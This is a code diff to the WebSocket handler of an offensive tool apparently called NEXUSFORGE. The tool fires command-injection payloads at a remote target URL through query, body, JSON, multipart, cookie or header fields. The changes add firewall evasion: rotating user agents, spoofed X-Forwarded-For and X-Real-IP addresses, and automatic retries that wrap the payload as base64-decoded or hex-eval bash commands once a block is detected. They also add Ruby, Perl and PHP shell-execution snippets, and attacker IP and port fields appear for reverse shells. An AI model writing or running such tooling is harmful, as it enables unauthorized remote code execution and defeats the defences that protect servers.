@@ -24,6 +24,16 @@ function send(ws: WebSocket, obj: unknown): void {
   if (ws.readyState === 1) ws.send(JSON.stringify(obj));
 }
 
+const WAF_UA_POOL = [
+  "Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0",
+  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
+  "curl/7.88.1",
+  "python-requests/2.31.0",
+  "Go-http-client/1.1",
+  "Wget/1.21.3",
+];
+
 async function handleRemoteInject(
   ws: WebSocket,
   injectionUrl: string,
@@ -34,7 +44,7 @@ async function handleRemoteInject(
   start: number,
   originalCmd: string,
   engine: string,
-  mode: string
+  mode: string,
 ): Promise<void> {
   let parsedUrl: URL;
   try {
@@ -46,13 +56,19 @@ async function handleRemoteInject(
   }
 
   const method = (httpMethod || "GET").toUpperCase();
-  const param  = injectParam || "cmd";
+  const param = injectParam || "cmd";
 
+  const ua = WAF_UA_POOL[Math.floor(Math.random() * WAF_UA_POOL.length)]!;
   const baseHeaders: Record<string, string> = {
-    "User-Agent":      "Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0",
+    "User-Agent":      ua,
     "Accept":          "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
     "Accept-Language": "en-US,en;q=0.5",
-    "Connection":      "close",
+    "Accept-Encoding": "gzip, deflate",
+    "Connection":      "keep-alive",
+    "Cache-Control":   "no-cache",
+    "Pragma":          "no-cache",
+    "X-Forwarded-For": `${Math.floor(Math.random()*223)+1}.${Math.floor(Math.random()*254)+1}.${Math.floor(Math.random()*254)+1}.${Math.floor(Math.random()*254)+1}`,
+    "X-Real-IP":       `10.${Math.floor(Math.random()*254)}.${Math.floor(Math.random()*254)}.${Math.floor(Math.random()*254)}`,
   };
 
   if (customHeaders.trim()) {
@@ -67,78 +83,101 @@ async function handleRemoteInject(
   }
 
   send(ws, { type: "data", chunk: `[NEXUSFORGE] Remote Injection\n` });
-  send(ws, { type: "data", chunk: `[TARGET]     ${parsedUrl.toString()}\n` });
-  send(ws, { type: "data", chunk: `[METHOD]     ${method}\n` });
-  send(ws, { type: "data", chunk: `[PARAMETER]  ${param}\n` });
-  send(ws, { type: "data", chunk: `[PAYLOAD]    ${payload.slice(0, 120)}${payload.length > 120 ? "…" : ""}\n` });
+  send(ws, { type: "data", chunk: `[TARGET]    ${parsedUrl.toString()}\n` });
+  send(ws, { type: "data", chunk: `[METHOD]    ${method}\n` });
+  send(ws, { type: "data", chunk: `[PARAM]     ${param}\n` });
+  send(ws, { type: "data", chunk: `[UA]        ${ua}\n` });
+  send(ws, { type: "data", chunk: `[PAYLOAD]   ${payload.slice(0, 120)}${payload.length > 120 ? "…" : ""}\n` });
   send(ws, { type: "data", chunk: `─────────────────────────────────────────────────────\n\n` });
 
-  try {
-    let response: Response;
-
-    if (method === "GET") {
-      parsedUrl.searchParams.set(param, payload);
-      response = await fetch(parsedUrl.toString(), {
-        method: "GET",
-        headers: baseHeaders,
-        signal: AbortSignal.timeout(30000),
-      });
-    } else if (method === "POST") {
-      const body = new URLSearchParams({ [param]: payload });
-      baseHeaders["Content-Type"] = "application/x-www-form-urlencoded";
-      response = await fetch(parsedUrl.toString(), {
-        method: "POST",
-        headers: baseHeaders,
-        body: body.toString(),
-        signal: AbortSignal.timeout(30000),
-      });
-    } else if (method === "JSON") {
-      baseHeaders["Content-Type"] = "application/json";
-      response = await fetch(parsedUrl.toString(), {
-        method: "POST",
-        headers: baseHeaders,
-        body: JSON.stringify({ [param]: payload }),
-        signal: AbortSignal.timeout(30000),
-      });
-    } else if (method === "PUT") {
-      baseHeaders["Content-Type"] = "application/x-www-form-urlencoded";
-      response = await fetch(parsedUrl.toString(), {
-        method: "PUT",
-        headers: baseHeaders,
-        body: new URLSearchParams({ [param]: payload }).toString(),
-        signal: AbortSignal.timeout(30000),
-      });
-    } else {
-      send(ws, { type: "error", message: `Unsupported method: ${method}` });
-      ws.close();
-      return;
+  const attemptFetch = async (pld: string, attempt: number): Promise<boolean> => {
+    if (attempt > 1) {
+      send(ws, { type: "data", chunk: `\n[RETRY #${attempt}] escalating bypass...\n` });
     }
+    try {
+      let response: Response;
+      const hdrs = { ...baseHeaders };
 
-    const statusLine = `HTTP/${response.status} ${response.statusText}`;
-    send(ws, { type: "data", chunk: `${statusLine}\n` });
-    response.headers.forEach((val, key) => {
-      send(ws, { type: "data", chunk: `${key}: ${val}\n` });
-    });
-    send(ws, { type: "data", chunk: `\n` });
+      if (method === "GET") {
+        parsedUrl.searchParams.set(param, pld);
+        response = await fetch(parsedUrl.toString(), { method: "GET", headers: hdrs, signal: AbortSignal.timeout(30000) });
+      } else if (method === "POST") {
+        hdrs["Content-Type"] = "application/x-www-form-urlencoded";
+        response = await fetch(parsedUrl.toString(), { method: "POST", headers: hdrs, body: new URLSearchParams({ [param]: pld }).toString(), signal: AbortSignal.timeout(30000) });
+      } else if (method === "JSON") {
+        hdrs["Content-Type"] = "application/json";
+        response = await fetch(parsedUrl.toString(), { method: "POST", headers: hdrs, body: JSON.stringify({ [param]: pld }), signal: AbortSignal.timeout(30000) });
+      } else if (method === "PUT") {
+        hdrs["Content-Type"] = "application/x-www-form-urlencoded";
+        response = await fetch(parsedUrl.toString(), { method: "PUT", headers: hdrs, body: new URLSearchParams({ [param]: pld }).toString(), signal: AbortSignal.timeout(30000) });
+      } else if (method === "MULTIPART") {
+        const fd = new FormData();
+        fd.append(param, pld);
+        response = await fetch(parsedUrl.toString(), { method: "POST", headers: { "User-Agent": hdrs["User-Agent"]! }, body: fd, signal: AbortSignal.timeout(30000) });
+      } else if (method === "COOKIE") {
+        hdrs["Cookie"] = `${param}=${encodeURIComponent(pld)}`;
+        response = await fetch(parsedUrl.toString(), { method: "GET", headers: hdrs, signal: AbortSignal.timeout(30000) });
+      } else if (method === "HEADER") {
+        hdrs[param] = pld;
+        response = await fetch(parsedUrl.toString(), { method: "GET", headers: hdrs, signal: AbortSignal.timeout(30000) });
+      } else {
+        send(ws, { type: "error", message: `Unsupported method: ${method}` });
+        ws.close();
+        return false;
+      }
 
-    const text = await response.text();
-    send(ws, { type: "data", chunk: text });
+      const statusLine = `HTTP ${response.status} ${response.statusText}`;
+      send(ws, { type: "data", chunk: `${statusLine}\n` });
+      response.headers.forEach((val, key) => {
+        send(ws, { type: "data", chunk: `${key}: ${val}\n` });
+      });
+      send(ws, { type: "data", chunk: `\n` });
+      const text = await response.text();
+      send(ws, { type: "data", chunk: text });
 
-    const elapsed = Date.now() - start;
-    logInjection(originalCmd, `remote/${method.toLowerCase()}`, mode, elapsed);
-    send(ws, { type: "end", code: response.ok ? 0 : 1, elapsed });
-    ws.close();
-  } catch (err: unknown) {
-    const msg = (err as Error).message ?? String(err);
-    send(ws, { type: "error", message: `Remote injection failed: ${msg}` });
-    logInjection(originalCmd, engine, mode, Date.now() - start);
-    if (ws.readyState === 1) ws.close();
+      const blocked = response.status === 403 || response.status === 406 || response.status === 429 ||
+        text.toLowerCase().includes("blocked") || text.toLowerCase().includes("forbidden") ||
+        text.toLowerCase().includes("waf") || text.toLowerCase().includes("security");
+
+      if (blocked && attempt === 1) {
+        send(ws, { type: "data", chunk: `\n[WAF DETECTED: HTTP ${response.status}] Escalating bypass...\n` });
+        return false;
+      }
+
+      const elapsed = Date.now() - start;
+      logInjection(originalCmd, `remote/${method.toLowerCase()}`, mode, elapsed);
+      send(ws, { type: "end", code: response.ok ? 0 : 1, elapsed });
+      ws.close();
+      return true;
+    } catch (err: unknown) {
+      const msg = (err as Error).message ?? String(err);
+      if (attempt === 1) {
+        send(ws, { type: "data", chunk: `\n[ERROR] ${msg} — retrying with alternate encoding...\n` });
+        return false;
+      }
+      send(ws, { type: "error", message: `Remote injection failed: ${msg}` });
+      logInjection(originalCmd, engine, mode, Date.now() - start);
+      if (ws.readyState === 1) ws.close();
+      return true;
+    }
+  };
+
+  const ok1 = await attemptFetch(payload, 1);
+  if (!ok1) {
+    const b64 = Buffer.from(payload).toString("base64");
+    const hex = Array.from(Buffer.from(payload)).map(b => `\\x${b.toString(16).padStart(2,"0")}`).join("");
+    const escalated = `{echo,${b64}}|{base64,-d}|bash`;
+    await attemptFetch(escalated, 2);
+    if (ws.readyState === 1) {
+      const hexAttempt = `eval "$(printf '${hex}')"`;
+      await attemptFetch(hexAttempt, 3);
+    }
   }
 }
 
 function buildSpawnTarget(
   processed: string,
-  engine: string
+  engine: string,
 ): { file: string; args: string[]; precompile?: () => { file: string; args: string[] } } {
   const [lang, func = "exec"] = engine.split("/");
 
@@ -153,8 +192,7 @@ function buildSpawnTarget(
           "-e",
           `const {spawn}=require('child_process');` +
           `const p=spawn('/bin/sh',['-c',${JSON.stringify(processed)}],{stdio:'inherit'});` +
-          `p.on('error',e=>process.stderr.write(e.message+'\\n'));` +
-          (func === "spawn" ? "" : ""),
+          `p.on('error',e=>process.stderr.write(e.message+'\\n'));`,
         ],
       };
 
@@ -167,24 +205,41 @@ function buildSpawnTarget(
             `import subprocess,sys\n` +
             `p=subprocess.Popen(${JSON.stringify(processed)},shell=True,` +
             `stdout=subprocess.PIPE,stderr=subprocess.STDOUT)\n` +
-            `[sys.stdout.buffer.write(c) or sys.stdout.flush() ` +
-            `for c in iter(lambda:p.stdout.read(1),b'')]\n` +
+            `[sys.stdout.buffer.write(c) or sys.stdout.flush() for c in iter(lambda:p.stdout.read(1),b'')]\n` +
             `p.wait()`,
           ],
         };
       }
-      return {
-        file: "python3",
-        args: ["-u", "-c", `import os\nos.system(${JSON.stringify(processed)})`],
-      };
+      return { file: "python3", args: ["-u", "-c", `import os\nos.system(${JSON.stringify(processed)})`] };
 
     case "php": {
       const snippets: Record<string, string> = {
         system:    `$p=popen(${JSON.stringify(processed)},'r');while(!feof($p)){echo fread($p,128);ob_flush();flush();}pclose($p);`,
         exec:      `$o=[];exec(${JSON.stringify(processed)},$o);echo implode("\\n",$o)."\\n";`,
         shell_exec:`echo shell_exec(${JSON.stringify(processed)});`,
+        passthru:  `passthru(${JSON.stringify(processed)});`,
       };
       return { file: "php", args: ["-r", snippets[func] ?? snippets["shell_exec"]!] };
+    }
+
+    case "ruby": {
+      const snippets: Record<string, string> = {
+        system:  `system(${JSON.stringify(processed)})`,
+        popen:   `IO.popen(${JSON.stringify(processed)},"r"){|io| $stdout.write(io.read); $stdout.flush}`,
+        exec:    `exec(${JSON.stringify(processed)})`,
+        open:    `open("|"+${JSON.stringify(processed)}){|io| STDOUT.write(io.read); STDOUT.flush}`,
+      };
+      return { file: "ruby", args: ["-e", snippets[func] ?? snippets["system"]!] };
+    }
+
+    case "perl": {
+      const snippets: Record<string, string> = {
+        system:  `system(${JSON.stringify(processed)})`,
+        exec:    `exec(${JSON.stringify(processed)})`,
+        open:    `open(my $fh,"-|",${JSON.stringify(processed)}) or die $!; print while <$fh>; close $fh;`,
+        qx:      `my $out=qx(${processed.replace(/[()]/g, "\\$&")});print $out;`,
+      };
+      return { file: "perl", args: ["-e", snippets[func] ?? snippets["system"]!] };
     }
 
     case "powershell":
@@ -229,8 +284,8 @@ function buildSpawnTarget(
         file: "",
         args: [],
         precompile: () => {
-          const tmp  = mkdtempSync(join(tmpdir(), "nxc-"));
-          const bin  = `${tmp}/nexus_bin`;
+          const tmp = mkdtempSync(join(tmpdir(), "nxc-"));
+          const bin = `${tmp}/nexus_bin`;
           writeFileSync(`${tmp}/nexus.c`, src);
           execSync(`gcc ${tmp}/nexus.c -o ${bin}`, { timeout: 15000, stdio: "ignore" });
           return { file: bin, args: [] };
@@ -255,16 +310,16 @@ export function handleStreamExec(ws: WebSocket): void {
     }
 
     const {
-      cmd          = "",
-      engine       = "bash/bash",
-      mode         = "classic",
-      target       = "target",
-      injectionUrl = "",
-      injectParam  = "cmd",
-      httpMethod   = "GET",
+      cmd           = "",
+      engine        = "bash/bash",
+      mode          = "classic",
+      target        = "target",
+      injectionUrl  = "",
+      injectParam   = "cmd",
+      httpMethod    = "GET",
       customHeaders = "",
-      attackerIp   = "127.0.0.1",
-      attackerPort = "4444",
+      attackerIp    = "127.0.0.1",
+      attackerPort  = "4444",
     } = req;
 
     if (!cmd.trim()) {
@@ -278,10 +333,7 @@ export function handleStreamExec(ws: WebSocket): void {
 
     if (injectionUrl.trim()) {
       logger.info({ injectionUrl, method: httpMethod, param: injectParam, mode }, "ws/exec remote");
-      void handleRemoteInject(
-        ws, injectionUrl.trim(), injectParam, httpMethod,
-        customHeaders, processed, start, cmd, engine, mode
-      );
+      void handleRemoteInject(ws, injectionUrl.trim(), injectParam, httpMethod, customHeaders, processed, start, cmd, engine, mode);
       return;
     }
 
@@ -317,7 +369,7 @@ export function handleStreamExec(ws: WebSocket): void {
       });
 
       const killTimer = setTimeout(() => {
-        try { child.kill("SIGTERM"); } catch { /* ignore */ }
+        try { child.kill("SIGTERM"); } catch { /* */ }
         send(ws, { type: "data", chunk: "\n[TIMEOUT — 30s]\n" });
       }, 30000);
 
@@ -332,7 +384,7 @@ export function handleStreamExec(ws: WebSocket): void {
       child.on("error", (err: NodeJS.ErrnoException) => {
         clearTimeout(killTimer);
         if (err.code === "ENOENT") {
-          send(ws, { type: "data", chunk: `[${file}: not found — shell fallback]\n` });
+          send(ws, { type: "data", chunk: `[${file}: not found — bash fallback]\n` });
           runSpawn("/bin/bash", ["-c", processed]);
         } else {
           send(ws, { type: "error", message: err.message });
@@ -343,7 +395,7 @@ export function handleStreamExec(ws: WebSocket): void {
 
       ws.on("close", () => {
         clearTimeout(killTimer);
-        try { child.kill("SIGTERM"); } catch { /* ignore */ }
+        try { child.kill("SIGTERM"); } catch { /* */ }
       });
     };
 
